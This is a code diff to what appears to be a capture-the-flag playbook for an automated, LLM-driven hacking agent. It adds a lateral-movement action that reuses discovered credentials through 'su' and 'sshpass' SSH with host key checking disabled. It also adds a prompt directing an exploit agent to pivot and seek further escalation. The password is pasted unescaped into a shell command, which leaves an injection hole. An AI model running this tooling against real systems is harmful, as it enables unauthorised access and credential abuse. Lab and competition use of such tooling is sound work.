@@ -4,6 +4,7 @@ import { linuxPrivesc, windowsPrivesc } from "./shared/privesc.js";
 import { crackHashes } from "./shared/cred-cracking.js";
 import { sysinfo, localCreds, internalNet } from "./shared/post-exploit.js";
 import { pathTraversal } from "./shared/path-traversal.js";
+import { enumerateContext, identifyBoundary } from "./shared/lateral-movement.js";
 
 /** @module Recon */
 
@@ -380,6 +381,32 @@ const flagCapture: Action = {
   },
 };
 
+/** @module Lateral movement */
+
+const lateralMovement: Action = {
+  name: "lateral_move",
+  description: "Lateral movement: use discovered credentials to pivot to other users",
+  on: (e) => e.type === "CredentialFound" && e.payload.username != null && e.payload.password != null,
+  emits: ["ShellObtained"],
+  async run(ctx) {
+    const { username, password } = ctx.event.payload;
+    await enumerateContext(ctx);
+    await identifyBoundary(ctx);
+    const su = await ctx.exec("sh", ["-c", `echo '${password}' | su -s /bin/bash ${username} -c id`]);
+    if (su.code === 0 && su.stdout.includes("uid=")) {
+      await ctx.emit("ShellObtained", { user: username, method: "su", context: su.stdout.trim() });
+      await ctx.discover("positive", "lateral", `Pivoted to ${username} via su`);
+    }
+    const ssh = await ctx.exec("sshpass", ["-p", password as string, "ssh", "-o", "StrictHostKeyChecking=no", `${username}@${ctx.target}`, "id"]);
+    if (ssh.code === 0 && ssh.stdout.includes("uid=")) {
+      await ctx.emit("ShellObtained", { user: username, method: "ssh", context: ssh.stdout.trim() });
+      await ctx.discover("positive", "lateral", `Pivoted to ${username} via SSH`);
+    }
+  },
+  prompt: "Use the discovered credentials ({username}:{password}) to move laterally. Try su, SSH, and any service-specific auth. Once you have a new shell, enumerate the new user's context for further escalation paths.",
+  llm: { agent: "exploit-agent", session: "fresh" },
+};
+
 /** @module Fallback */
 
 const stallDetection: Action = {
@@ -406,6 +433,7 @@ export const CTF_PLAYBOOK: Playbook = {
     // Post-exploitation
     postExploitEnum, privesc, credCrack, flagCapture,
     // Fallback
+    lateralMovement,
     stallDetection,
   ],
 };
